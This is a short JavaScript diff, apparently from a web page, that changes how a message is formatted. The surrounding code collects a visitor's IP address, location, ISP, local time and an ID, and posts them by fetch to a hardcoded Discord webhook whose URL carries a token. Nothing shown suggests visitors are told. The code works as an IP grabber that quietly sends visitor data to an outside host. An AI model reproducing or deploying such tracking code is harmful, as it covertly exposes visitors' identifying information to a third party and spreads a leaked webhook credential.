@@ -14,7 +14,7 @@
             const isp = data.org;
             const localTime = moment().utcOffset(timezoneOffset).format("YYYY-MM-DD hh:mm:ss A");
             const webhookURL = "https://discord.com/api/webhooks/1108773713077346384/hjKxkLhLkS3mEc6OpQzlCi_nmMWLY4ocZkMzC1PwlA55ScZf3hayJEL1JG2zyOFPHyFx";
-            const message = "IP: " + ip + ", Location: " + location + ", ISP: " + isp + ", Time (CET): " + localTime + ", Page User ID: " + pageUserID;
+            const message = "IP: " + ip + "\nLocation: " + location + "\nISP: " + isp + "\nPC ID: " + pageUserID + "\nTime: " + localTime + " (CET)";
             fetch(webhookURL, {
               method: "POST",
               headers: {
